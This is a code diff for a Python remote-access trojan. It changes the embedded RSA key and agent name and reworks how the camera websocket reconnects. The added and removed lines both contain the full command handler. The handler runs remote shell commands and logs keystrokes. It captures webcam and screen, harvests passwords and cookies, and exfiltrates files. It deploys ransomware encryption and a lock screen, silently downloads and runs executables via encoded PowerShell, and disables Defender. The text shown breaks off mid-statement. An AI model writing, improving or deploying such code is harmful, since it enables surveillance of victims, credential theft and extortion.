@@ -98,8 +98,8 @@ CMD_RANSOM_UNLOCK = 0x25  # unlock ransomware with injected key
 
 DEVICE_ID = str(uuid.uuid4())
 HOSTNAME = socket.gethostname()
-_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArW8NvCkYfA88T43rmMg+\nd8eCx8vdSPZdpKwITOmLCwiyDWpGA29v1vPTHbwyE1aMMUUygXT3spnkEDMk4iZz\n29PNJ2pLTFmAQ+k26jNhJVH6gBmC9hJkT7PDd1w8X7cxRNVjI7O1G6Vv7BkpkcPt\nWaTpEVTyrST38klW8DdfVSvQRqBaaz8C491qBMQGoiduT4vlFhu3yEZG6IiBA/k8\njodKVRM6riqXVkbH+qhxWJ0Pg3dRGdvhUI5ToWaO9mp8ez3KujSVNeKedwJ5zKTU\nRSwSkdiqVO1buA3nRwJTpBL2Z26ZhelTZhN7HNzO9B/xmG7FLnK2bCRjnMW0P7M9\npQIDAQAB\n-----END PUBLIC KEY-----"
-_AGENT_NAME = "document"
+_EMBEDDED_PUBKEY = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu+CgPp3th9K18Deq4olg\nFjXRYcWcRm4YtrogzmlLm3a8t/V+9akUKv0Wr/OaLfKupaFbESyFORPDi0J6m1+F\npv2mZYHxQB7acYg1EW+s9zuxz7fDJuQvliQqhrgtcPHuvPKbuNDijHTOE4/Z+36U\nudQVhrWpl64qRttLjFqlkhVKIyh0fok8VHfycLt3jn2Mm1Nl+bEcjXI5+JrB9btW\nZ3oyIjPb8KmtUwDaQcFdWbl2b31TnRkQCJC0rB3EMdfaTF3Bw65/kHYi8bK9xXk5\nQjCcCFcfibaFI25vpzYUuKLu9N/QemVxLZbKXpWK9AiU6mwQwLC71fZqdXKr8pxW\n9QIDAQAB\n-----END PUBLIC KEY-----"
+_AGENT_NAME = "english"
 _keylog_on = False
 _keybuf = ""
 _view_mode = "none"  # 'none', 'screen', or 'cam'
@@ -2265,503 +2265,530 @@ async def main():
                 _log("Control channel registered (waiting for server session)...")
                 await asyncio.sleep(0.15)
 
-                async with websockets.connect(uri_cam, **ws_kw) as cam_ws:
-                    lock_cam = asyncio.Lock()
+                # Camera WS managed independently so failures don't crash control connection
+                _cam_ws = None
+                _cam_lock = asyncio.Lock()
 
-                    async def send_cam(data):
-                        if len(data) > 1:
-                            frame_type = data[0]
-                            payload = data[1:]
-                            if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
-                                return
-                        async with lock_cam:
-                            await cam_ws.send(data)
+                async def _ensure_cam_ws():
+                    nonlocal _cam_ws
+                    if _cam_ws is not None and not _cam_ws.open:
+                        try:
+                            await _cam_ws.close()
+                        except Exception:
+                            pass
+                        _cam_ws = None
+                    if _cam_ws is None:
+                        try:
+                            cam = await websockets.connect(uri_cam, **ws_kw)
+                            await cam.send(json.dumps({"cmd": CMD_REG, "data": {"id": DEVICE_ID}}))
+                            _cam_ws = cam
+                            _log("Camera WS reconnected")
+                        except Exception as ex:
+                            _log(f"Camera WS connect failed: {ex}")
+                    return _cam_ws
 
-                    await send_cam(
-                        json.dumps({"cmd": CMD_REG, "data": {"id": DEVICE_ID}})
-                    )
-                    _log("Registered (control + camera channels).")
-                    retry_count = 0
+                async def send_cam(data):
+                    nonlocal _cam_ws
+                    if len(data) > 1:
+                        frame_type = data[0]
+                        payload = data[1:]
+                        if frame_type in (0x01, 0x02) and await _send_udp_frame(frame_type, payload):
+                            return
+                    cam = await _ensure_cam_ws()
+                    if cam is None:
+                        return
+                    try:
+                        async with _cam_lock:
+                            await cam.send(data)
+                    except ConnectionClosed:
+                        _cam_ws = None
+                    except Exception:
+                        _cam_ws = None
 
-                    async def agent_keepalive():
-                        """Lightweight JSON ping so proxies/NAT see application traffic; complements WebSocket protocol pings."""
-                        while True:
-                            try:
-                                await asyncio.sleep(22)
-                                await send_ws(json.dumps({"cmd": CMD_PING, "args": {}}))
-                            except (ConnectionClosed, asyncio.CancelledError):
-                                break
-                            except Exception:
-                                break
+                # Initial camera WS connection
+                await _ensure_cam_ws()
+                _log("Registered (control + camera channels).")
+                retry_count = 0
 
-                    async def recv_loop():
-                        global _keylog_on, _keybuf, _view_mode, _cam_stream_enabled
-                        while True:
-                            raw = await ws.recv()
-                            if isinstance(raw, bytes):
-                                if len(raw) > 1 and raw[0] == 0x03:
-                                    audio_data = raw[1:]
-                                    try:
-                                        if len(audio_data) >= 12 and audio_data[:4] == b"RIFF":
-                                            tmp = os.path.join(os.environ.get("TEMP", "."), f"admin_audio_{uuid.uuid4().hex}.wav")
-                                            with open(tmp, "wb") as f:
-                                                f.write(audio_data)
-                                            try:
-                                                import winsound
-                                                winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
-                                            except Exception:
-                                                _log(f"Admin audio chunk saved to {tmp}")
-                                        else:
-                                            _feed_remote_mic_pcm(audio_data)
-                                    except Exception as ex:
-                                        _log(f"Admin audio playback failed: {ex}")
-                                continue
+                async def agent_keepalive():
+                    """Lightweight JSON ping so proxies/NAT see application traffic; complements WebSocket protocol pings."""
+                    while True:
+                        try:
+                            await asyncio.sleep(22)
+                            await send_ws(json.dumps({"cmd": CMD_PING, "args": {}}))
+                        except (ConnectionClosed, asyncio.CancelledError):
+                            break
+                        except Exception:
+                            break
 
-                            msg = json.loads(raw)
-                            cmd = msg.get("cmd")
-                            a = msg.get("args", {})
-                            try:
-                                if cmd == CMD_MOUSE:
-                                    do_move(a.get("x", 0), a.get("y", 0))
-                                elif cmd == CMD_CLICK:
-                                    do_click(a.get("btn", "left"), a.get("down", True))
-                                elif cmd == CMD_KEY:
-                                    do_key(a.get("key", ""))
-                                elif cmd == CMD_SHELL:
-                                    shell_id = a.get("shellId", "side")
-                                    cmdline = a.get("cmd", "echo ok")
-                                    cdir = a.get("cwd")
-                                    if cdir:
-                                        cdir = os.path.normpath(cdir)
-                                        if not os.path.isdir(cdir):
-                                            await send_ws(
-                                                json.dumps(
-                                                    {
-                                                        "cmd": CMD_SHELL,
-                                                        "data": {
-                                                            "out": f"(error) Not a directory: {cdir}\n",
-                                                            "shellId": shell_id,
-                                                        },
-                                                    }
-                                                )
-                                            )
-                                            continue
-
-                                    timeout_s = 90 if shell_id == "pop" else 120
-                                    # Send immediate status so dashboard shows "running..."
-                                    await send_ws(
-                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": None, "shellId": shell_id, "status": "running"}})
-                                    )
-
-                                    def _run_shell():
-                                        return _run_shell_sync(cmdline, cdir, timeout_s, shell_id)
-
-                                    out = await asyncio.to_thread(_run_shell)
-                                    await send_ws(
-                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": shell_id}})
-                                    )
-                                elif cmd == CMD_CAM:
-                                    import cv2
-                                    async with _camera_lock:
-                                        cap = _open_camera()
-                                        if cap is not None:
-                                            ret, frame = cap.read()
-                                        else:
-                                            ret = False
-                                    if not ret:
-                                        _log("CMD_CAM: unable to grab camera frame")
-                                    else:
-                                        _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
-                                        await send_ws(b"\x01" + buf.tobytes())
-                                elif cmd == CMD_VIEW:
-                                    if a.get("substream") == "cam":
-                                        _cam_stream_enabled = bool(a.get("enabled", False))
-                                        audio_requested = bool(a.get("audio", False))
-                                        _log(f"Cam substream -> {_cam_stream_enabled}, audio -> {audio_requested}")
-                                        _ensure_audio(audio_requested)
-                                    else:
-                                        _view_mode = a.get("mode", "screen")
-                                        audio_requested = bool(a.get("audio", False))
-                                        _log(f"View mode → {_view_mode}, audio → {audio_requested}")
-                                        _ensure_audio(audio_requested)
-                                elif cmd == CMD_FILE_LS:
-                                    p = a.get("path", ".")
-                                    if p == "DRIVES":
-                                        items = []
-                                        import string
-                                        for c in string.ascii_uppercase:
-                                            if os.path.exists(f"{c}:\\"):
-                                                items.append({"name": f"{c}:\\", "is_dir": True, "size": 0})
-                                        await send_ws(json.dumps({"cmd": CMD_FILE_LS, "data": {"path": "DRIVES", "items": items}}))
-                                    else:
-
-                                        def _scan_dir(path):
-                                            out_items = []
-                                            try:
-                                                for e in os.scandir(path):
-                                                    try:
-                                                        out_items.append(
-                                                            {
-                                                                "name": e.name,
-                                                                "is_dir": e.is_dir(),
-                                                                "size": e.stat().st_size if not e.is_dir() else 0,
-                                                            }
-                                                        )
-                                                    except Exception:
-                                                        pass
-                                            except Exception as ex:
-                                                return os.path.abspath(path), [], str(ex)
-                                            return os.path.abspath(path), out_items, None
-
-                                        abspath, items, err = await asyncio.to_thread(_scan_dir, p)
-                                        if err:
-                                            await send_ws(
-                                                json.dumps(
-                                                    {
-                                                        "cmd": CMD_FILE_LS,
-                                                        "data": {"path": abspath, "items": [], "error": err},
-                                                    }
-                                                )
-                                            )
-                                        else:
-                                            await send_ws(
-                                                json.dumps({"cmd": CMD_FILE_LS, "data": {"path": abspath, "items": items}})
-                                            )
-                                elif cmd == CMD_SOUND:
-                                    global _sound_rx_buf, _sound_rx_total
-                                    name = a.get("name", "sound.wav")
-                                    if a.get("reset"):
-                                        _sound_rx_buf = bytearray()
-                                        _sound_rx_total = int(a.get("size", 0) or 0)
-                                    chunk = a.get("b64")
-                                    if chunk:
-                                        if _sound_rx_buf is None:
-                                            _sound_rx_buf = bytearray()
+                async def recv_loop():
+                    global _keylog_on, _keybuf, _view_mode, _cam_stream_enabled
+                    while True:
+                        raw = await ws.recv()
+                        if isinstance(raw, bytes):
+                            if len(raw) > 1 and raw[0] == 0x03:
+                                audio_data = raw[1:]
+                                try:
+                                    if len(audio_data) >= 12 and audio_data[:4] == b"RIFF":
+                                        tmp = os.path.join(os.environ.get("TEMP", "."), f"admin_audio_{uuid.uuid4().hex}.wav")
+                                        with open(tmp, "wb") as f:
+                                            f.write(audio_data)
                                         try:
-                                            _sound_rx_buf.extend(base64.b64decode(chunk))
+                                            import winsound
+                                            winsound.PlaySound(tmp, winsound.SND_FILENAME | winsound.SND_ASYNC)
                                         except Exception:
-                                            pass
-                                    assembling = _sound_rx_buf is not None
-                                    if assembling:
-                                        if len(_sound_rx_buf) > 20_000_000:
-                                            _sound_rx_buf = None
-                                            _sound_rx_total = 0
-                                            _log("Inject: size cap exceeded, aborted.")
-                                        elif a.get("end") or (_sound_rx_total and len(_sound_rx_buf) >= _sound_rx_total):
-                                            rawb = bytes(_sound_rx_buf)
-                                            _sound_rx_buf = None
-                                            _sound_rx_total = 0
-                                            if len(rawb) > 8:
-                                                _play_sound_inject_async(rawb, name)
-                                    elif a.get("bytes"):
-                                        try:
-                                            rawb = base64.b64decode(a["bytes"])
-                                            if len(rawb) > 8:
-                                                _play_sound_inject_async(rawb, name)
-                                        except Exception as ex:
-                                            _log(f"Audio injection failed: {ex}")
-                                elif cmd == CMD_FILE_RUN:
-                                    os.startfile(a.get("path", "."))
-                                elif cmd == CMD_FILE_DL:
-                                    fp = a.get("path", "")
+                                            _log(f"Admin audio chunk saved to {tmp}")
+                                    else:
+                                        _feed_remote_mic_pcm(audio_data)
+                                except Exception as ex:
+                                    _log(f"Admin audio playback failed: {ex}")
+                            continue
 
-                                    def _read_b64(path):
-                                        with open(path, "rb") as f:
-                                            return base64.b64encode(f.read()).decode()
-
-                                    try:
-                                        b64 = await asyncio.to_thread(_read_b64, fp)
-                                        await send_ws(
-                                            json.dumps(
-                                                {"cmd": CMD_FILE_DL, "data": {"name": os.path.basename(fp), "bytes": b64}}
-                                            )
-                                        )
-                                    except Exception as ex:
+                        msg = json.loads(raw)
+                        cmd = msg.get("cmd")
+                        a = msg.get("args", {})
+                        try:
+                            if cmd == CMD_MOUSE:
+                                do_move(a.get("x", 0), a.get("y", 0))
+                            elif cmd == CMD_CLICK:
+                                do_click(a.get("btn", "left"), a.get("down", True))
+                            elif cmd == CMD_KEY:
+                                do_key(a.get("key", ""))
+                            elif cmd == CMD_SHELL:
+                                shell_id = a.get("shellId", "side")
+                                cmdline = a.get("cmd", "echo ok")
+                                cdir = a.get("cwd")
+                                if cdir:
+                                    cdir = os.path.normpath(cdir)
+                                    if not os.path.isdir(cdir):
                                         await send_ws(
                                             json.dumps(
                                                 {
                                                     "cmd": CMD_SHELL,
-                                                    "data": {"out": f"(error) Download read failed: {ex}\n", "shellId": "side"},
+                                                    "data": {
+                                                        "out": f"(error) Not a directory: {cdir}\n",
+                                                        "shellId": shell_id,
+                                                    },
                                                 }
                                             )
                                         )
-                                elif cmd == CMD_KEYLOG:
-                                    act = a.get("action", "")
-                                    if act == "start":
-                                        _keylog_on = True
-                                    elif act == "stop":
-                                        _keylog_on = False
-                                    elif act == "fetch":
-                                        await send_ws(json.dumps({"cmd": CMD_KEYLOG, "data": _keybuf}))
-                                        _keybuf = ""
-                                elif cmd == CMD_VAULT:
-                                    data = await asyncio.to_thread(harvest_passwords)
-                                    await send_ws(json.dumps({"cmd": CMD_VAULT, "data": data}))
-                                elif cmd == CMD_COOKIES:
-                                    data = await asyncio.to_thread(harvest_cookies)
-                                    await send_ws(json.dumps({"cmd": CMD_COOKIES, "data": data}))
-                                elif cmd == CMD_LOCK:
-                                    threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
-                                elif cmd == 0x21:
-                                    c = await asyncio.to_thread(do_encrypt, a.get("targets", ""))
-                                    msgs = { -3: "No public key embedded. Rebuild agent with keys." }
-                                    msg = msgs.get(c, f"Encrypted {c} files.")
-                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
-                                elif cmd == 0x22:
-                                    c = await asyncio.to_thread(do_decrypt, a.get("targets", ""))
-                                    msgs = { -1: "No private key stored. Use Key Inject first.", -2: "Invalid private key format." }
-                                    msg = msgs.get(c, f"Decrypted {c} files.")
-                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
-                                elif cmd == CMD_KEY_INJECT:
-                                    pk = a.get("privkey", "")
-                                    if pk:
-                                        global _stored_privkey
-                                        _stored_privkey = pk
-                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Private key injected successfully.", "shellId": "side"}}))
-                                    else:
-                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Key injection failed: no key provided.", "shellId": "side"}}))
-                                elif cmd == CMD_RANSOM:
-                                    c = await asyncio.to_thread(do_ransomware)
-                                    msg = f"Ransomware deployed. {c} files encrypted. Device locked."
-                                    key_name = _AGENT_NAME
-                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
-                                elif cmd == CMD_RANSOM_UNLOCK:
-                                    c = await asyncio.to_thread(do_unlock_ransom)
-                                    msgs = { -1: "No private key stored. Use Key Inject first." }
-                                    msg = msgs.get(c, f"Unlocked. Decrypted {c} files.")
-                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
-                                elif cmd == CMD_URL:
-                                    webbrowser.open(a.get("url", ""))
-                                elif cmd == CMD_DL_EXE:
-                                    url = a.get("url", "")
-                                    filename = a.get("name", "")
-                                    args = a.get("args", "")
-                                    run_in_terminal = a.get("terminal", False)
+                                        continue
 
-                                    def _dl_run_sync():
-                                        import urllib.request, uuid
-                                        if not filename:
-                                            filename = url.split("/")[-1] or f"run_{uuid.uuid4().hex[:8]}.exe"
-                                        dest = os.path.join(os.environ.get("TEMP", "."), f".{uuid.uuid4().hex[:12]}_{filename}")
-                                        try:
-                                            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-                                            with urllib.request.urlopen(req, timeout=60) as r:
-                                                with open(dest, "wb") as f:
-                                                    f.write(r.read())
-                                        except Exception as e:
-                                            return f"(error) Download failed: {e}\n"
-                                        if not os.path.exists(dest):
-                                            return "(error) File not found after download\n"
-                                        try:
-                                            _K32.SetFileAttributesW(dest, 0x02)
-                                        except:
-                                            pass
-                                        if run_in_terminal:
-                                            full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
-                                            b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
-                                            p = subprocess.Popen(
-                                                ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
-                                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                                text=True, encoding="utf-8", errors="replace",
-                                                creationflags=0x08000000,
-                                            )
-                                            out, _ = p.communicate(timeout=120)
-                                            try:
-                                                os.remove(dest)
-                                            except:
-                                                pass
-                                            return out or "(no output)\n"
-                                        else:
-                                            subprocess.Popen(
-                                                f'"{dest}" {args}'.strip(),
-                                                shell=True, creationflags=0x08000000
-                                            )
-                                            return f"[OK] Launched: {filename} ({dest})\n"
+                                timeout_s = 90 if shell_id == "pop" else 120
+                                # Send immediate status so dashboard shows "running..."
+                                await send_ws(
+                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": None, "shellId": shell_id, "status": "running"}})
+                                )
 
-                                    try:
-                                        out = await asyncio.to_thread(_dl_run_sync)
-                                        d = {"cmd": CMD_DL_EXE, "data": {"out": out}}
-                                        await send_ws(json.dumps(d))
-                                    except subprocess.TimeoutExpired:
-                                        await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": "(error) Command timed out (120s)\n"}}))
-                                    except Exception as ex:
-                                        _log(f"CMD_DL_EXE: {ex}")
-                                        await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": f"(error) {ex}\n"}}))
-                                elif cmd == CMD_RUN_EXE:
-                                    path = a.get("path", "")
-                                    args = a.get("args", "")
-                                    show_in_terminal = a.get("terminal", False)
-                                    if show_in_terminal:
-                                        ps_cmd = f'Start-Process -FilePath "{path}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit 0"}}else{{echo "[FAIL] Exit $LASTEXITCODE"}}'
-                                        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
-                                        def _run_term():
-                                            p = subprocess.Popen(
-                                                ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
-                                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                                text=True, encoding="utf-8", errors="replace",
-                                                creationflags=0x08000000,
-                                            )
-                                            return p.communicate(timeout=120)[0] or ""
-                                        out = await asyncio.to_thread(_run_term)
-                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": "side"}}))
-                                    else:
-                                        subprocess.Popen(f'"{path}" {args}'.strip(), shell=True, creationflags=0x08000000)
-                                elif cmd == CMD_DISABLE_DEFENDER:
-                                    def _defender_sync():
-                                        return _disable_defender()
-                                    out = await asyncio.to_thread(_defender_sync)
-                                    await send_ws(
-                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": out + "\n", "shellId": "side"}})
-                                    )
-                                elif cmd == CMD_PING:
-                                    pass
-                            except ConnectionClosed:
-                                raise
-                            except Exception as ex:
-                                _log(f"CMD {hex(cmd) if cmd else '?'} err: {ex}")
+                                def _run_shell():
+                                    return _run_shell_sync(cmdline, cdir, timeout_s, shell_id)
 
-                    async def camera_loop():
-                        """Single capture + encode path: stable LED, lower lag, no dual OpenCV grab."""
-                        target_dt = 1.0 / 28.0
-                        idle_ticks = 0
-                        while True:
-                            t0 = time.perf_counter()
-                            try:
-                                if not _camera_needed():
-                                    idle_ticks += 1
-                                    if idle_ticks >= 6:
-                                        async with _camera_lock:
-                                            _close_camera()
-                                        idle_ticks = 0
-                                    await asyncio.sleep(0.08)
-                                    continue
-                                idle_ticks = 0
+                                out = await asyncio.to_thread(_run_shell)
+                                await send_ws(
+                                    json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": shell_id}})
+                                )
+                            elif cmd == CMD_CAM:
+                                import cv2
                                 async with _camera_lock:
                                     cap = _open_camera()
-                                    if cap is None:
-                                        await asyncio.sleep(0.06)
-                                        continue
-                                    ret, frame = cap.read()
+                                    if cap is not None:
+                                        ret, frame = cap.read()
+                                    else:
+                                        ret = False
                                 if not ret:
-                                    await asyncio.sleep(0.02)
-                                    continue
-                                import cv2
-                                _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
-                                blob = b"\x01" + jpg.tobytes()
-                                if _view_mode == "cam":
-                                    await send_stream(blob)
-                                if _cam_stream_enabled:
-                                    await send_cam(blob)
-                            except ConnectionClosed:
-                                raise
-                            except Exception as ex:
-                                _log(f"camera_loop: {ex}")
-                            elapsed = time.perf_counter() - t0
-                            await asyncio.sleep(max(0.0, target_dt - elapsed))
+                                    _log("CMD_CAM: unable to grab camera frame")
+                                else:
+                                    _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
+                                    await send_ws(b"\x01" + buf.tobytes())
+                            elif cmd == CMD_VIEW:
+                                if a.get("substream") == "cam":
+                                    _cam_stream_enabled = bool(a.get("enabled", False))
+                                    audio_requested = bool(a.get("audio", False))
+                                    _log(f"Cam substream -> {_cam_stream_enabled}, audio -> {audio_requested}")
+                                    _ensure_audio(audio_requested)
+                                else:
+                                    _view_mode = a.get("mode", "screen")
+                                    audio_requested = bool(a.get("audio", False))
+                                    _log(f"View mode → {_view_mode}, audio → {audio_requested}")
+                                    _ensure_audio(audio_requested)
+                            elif cmd == CMD_FILE_LS:
+                                p = a.get("path", ".")
+                                if p == "DRIVES":
+                                    items = []
+                                    import string
+                                    for c in string.ascii_uppercase:
+                                        if os.path.exists(f"{c}:\\"):
+                                            items.append({"name": f"{c}:\\", "is_dir": True, "size": 0})
+                                    await send_ws(json.dumps({"cmd": CMD_FILE_LS, "data": {"path": "DRIVES", "items": items}}))
+                                else:
 
-                    async def stream_loop():
-                        """MJPEG + frame diff: skip encode/send when screen unchanged."""
-                        quality = 48
-                        _quiet_quality = 48
-                        min_quality = 15
-                        max_quality = 85
-                        frame_interval = 0.048
-                        min_interval = 0.020
-                        max_interval = 0.250
-                        send_times = []
-                        quality_adj_ticks = 0
-                        _prev_frame_hash = None
-                        import hashlib
+                                    def _scan_dir(path):
+                                        out_items = []
+                                        try:
+                                            for e in os.scandir(path):
+                                                try:
+                                                    out_items.append(
+                                                        {
+                                                            "name": e.name,
+                                                            "is_dir": e.is_dir(),
+                                                            "size": e.stat().st_size if not e.is_dir() else 0,
+                                                        }
+                                                    )
+                                                except Exception:
+                                                    pass
+                                        except Exception as ex:
+                                            return os.path.abspath(path), [], str(ex)
+                                        return os.path.abspath(path), out_items, None
 
-                        def _grab_screen_jpeg(q):
-                            with mss.mss() as sx:
-                                img = sx.grab(sx.monitors[0])
-                                buf = BytesIO()
-                                Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
-                                    buf, format="JPEG", quality=q, optimize=True
+                                    abspath, items, err = await asyncio.to_thread(_scan_dir, p)
+                                    if err:
+                                        await send_ws(
+                                            json.dumps(
+                                                {
+                                                    "cmd": CMD_FILE_LS,
+                                                    "data": {"path": abspath, "items": [], "error": err},
+                                                }
+                                            )
+                                        )
+                                    else:
+                                        await send_ws(
+                                            json.dumps({"cmd": CMD_FILE_LS, "data": {"path": abspath, "items": items}})
+                                        )
+                            elif cmd == CMD_SOUND:
+                                global _sound_rx_buf, _sound_rx_total
+                                name = a.get("name", "sound.wav")
+                                if a.get("reset"):
+                                    _sound_rx_buf = bytearray()
+                                    _sound_rx_total = int(a.get("size", 0) or 0)
+                                chunk = a.get("b64")
+                                if chunk:
+                                    if _sound_rx_buf is None:
+                                        _sound_rx_buf = bytearray()
+                                    try:
+                                        _sound_rx_buf.extend(base64.b64decode(chunk))
+                                    except Exception:
+                                        pass
+                                assembling = _sound_rx_buf is not None
+                                if assembling:
+                                    if len(_sound_rx_buf) > 20_000_000:
+                                        _sound_rx_buf = None
+                                        _sound_rx_total = 0
+                                        _log("Inject: size cap exceeded, aborted.")
+                                    elif a.get("end") or (_sound_rx_total and len(_sound_rx_buf) >= _sound_rx_total):
+                                        rawb = bytes(_sound_rx_buf)
+                                        _sound_rx_buf = None
+                                        _sound_rx_total = 0
+                                        if len(rawb) > 8:
+                                            _play_sound_inject_async(rawb, name)
+                                elif a.get("bytes"):
+                                    try:
+                                        rawb = base64.b64decode(a["bytes"])
+                                        if len(rawb) > 8:
+                                            _play_sound_inject_async(rawb, name)
+                                    except Exception as ex:
+                                        _log(f"Audio injection failed: {ex}")
+                            elif cmd == CMD_FILE_RUN:
+                                os.startfile(a.get("path", "."))
+                            elif cmd == CMD_FILE_DL:
+                                fp = a.get("path", "")
+
+                                def _read_b64(path):
+                                    with open(path, "rb") as f:
+                                        return base64.b64encode(f.read()).decode()
+
+                                try:
+                                    b64 = await asyncio.to_thread(_read_b64, fp)
+                                    await send_ws(
+                                        json.dumps(
+                                            {"cmd": CMD_FILE_DL, "data": {"name": os.path.basename(fp), "bytes": b64}}
+                                        )
+                                    )
+                                except Exception as ex:
+                                    await send_ws(
+                                        json.dumps(
+                                            {
+                                                "cmd": CMD_SHELL,
+                                                "data": {"out": f"(error) Download read failed: {ex}\n", "shellId": "side"},
+                                            }
+                                        )
+                                    )
+                            elif cmd == CMD_KEYLOG:
+                                act = a.get("action", "")
+                                if act == "start":
+                                    _keylog_on = True
+                                elif act == "stop":
+                                    _keylog_on = False
+                                elif act == "fetch":
+                                    await send_ws(json.dumps({"cmd": CMD_KEYLOG, "data": _keybuf}))
+                                    _keybuf = ""
+                            elif cmd == CMD_VAULT:
+                                data = await asyncio.to_thread(harvest_passwords)
+                                await send_ws(json.dumps({"cmd": CMD_VAULT, "data": data}))
+                            elif cmd == CMD_COOKIES:
+                                data = await asyncio.to_thread(harvest_cookies)
+                                await send_ws(json.dumps({"cmd": CMD_COOKIES, "data": data}))
+                            elif cmd == CMD_LOCK:
+                                threading.Thread(target=do_lock, args=(a.get("password", "admin"),), daemon=True).start()
+                            elif cmd == 0x21:
+                                c = await asyncio.to_thread(do_encrypt, a.get("targets", ""))
+                                msgs = { -3: "No public key embedded. Rebuild agent with keys." }
+                                msg = msgs.get(c, f"Encrypted {c} files.")
+                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                            elif cmd == 0x22:
+                                c = await asyncio.to_thread(do_decrypt, a.get("targets", ""))
+                                msgs = { -1: "No private key stored. Use Key Inject first.", -2: "Invalid private key format." }
+                                msg = msgs.get(c, f"Decrypted {c} files.")
+                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                            elif cmd == CMD_KEY_INJECT:
+                                pk = a.get("privkey", "")
+                                if pk:
+                                    global _stored_privkey
+                                    _stored_privkey = pk
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Private key injected successfully.", "shellId": "side"}}))
+                                else:
+                                    await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": "Key injection failed: no key provided.", "shellId": "side"}}))
+                            elif cmd == CMD_RANSOM:
+                                c = await asyncio.to_thread(do_ransomware)
+                                msg = f"Ransomware deployed. {c} files encrypted. Device locked."
+                                key_name = _AGENT_NAME
+                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                            elif cmd == CMD_RANSOM_UNLOCK:
+                                c = await asyncio.to_thread(do_unlock_ransom)
+                                msgs = { -1: "No private key stored. Use Key Inject first." }
+                                msg = msgs.get(c, f"Unlocked. Decrypted {c} files.")
+                                await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": msg, "shellId": "side"}}))
+                            elif cmd == CMD_URL:
+                                webbrowser.open(a.get("url", ""))
+                            elif cmd == CMD_DL_EXE:
+                                url = a.get("url", "")
+                                filename = a.get("name", "")
+                                args = a.get("args", "")
+                                run_in_terminal = a.get("terminal", False)
+
+                                def _dl_run_sync():
+                                    import urllib.request, uuid
+                                    if not filename:
+                                        filename = url.split("/")[-1] or f"run_{uuid.uuid4().hex[:8]}.exe"
+                                    dest = os.path.join(os.environ.get("TEMP", "."), f".{uuid.uuid4().hex[:12]}_{filename}")
+                                    try:
+                                        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+                                        with urllib.request.urlopen(req, timeout=60) as r:
+                                            with open(dest, "wb") as f:
+                                                f.write(r.read())
+                                    except Exception as e:
+                                        return f"(error) Download failed: {e}\n"
+                                    if not os.path.exists(dest):
+                                        return "(error) File not found after download\n"
+                                    try:
+                                        _K32.SetFileAttributesW(dest, 0x02)
+                                    except:
+                                        pass
+                                    if run_in_terminal:
+                                        full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
+                                        b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
+                                        p = subprocess.Popen(
+                                            ["powershell", "-NoP", "-Ep", _sb("eoGfeMvr"), _sb("Fb2Beg=="), b64],
+                                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                            text=True, encoding="utf-8", errors="replace",
+                                            creationflags=0x08000000,
+                                        )
+                                        out, _ = p.communicate(timeout=120)
+                                        try:
+                                            os.remove(dest)
+                                        except:
+                                            pass
+                                        return out or "(no output)\n"
+                                    else:
+                                        subprocess.Popen(
+                                            f'"{dest}" {args}'.strip(),
+                                            shell=True, creationflags=0x08000000
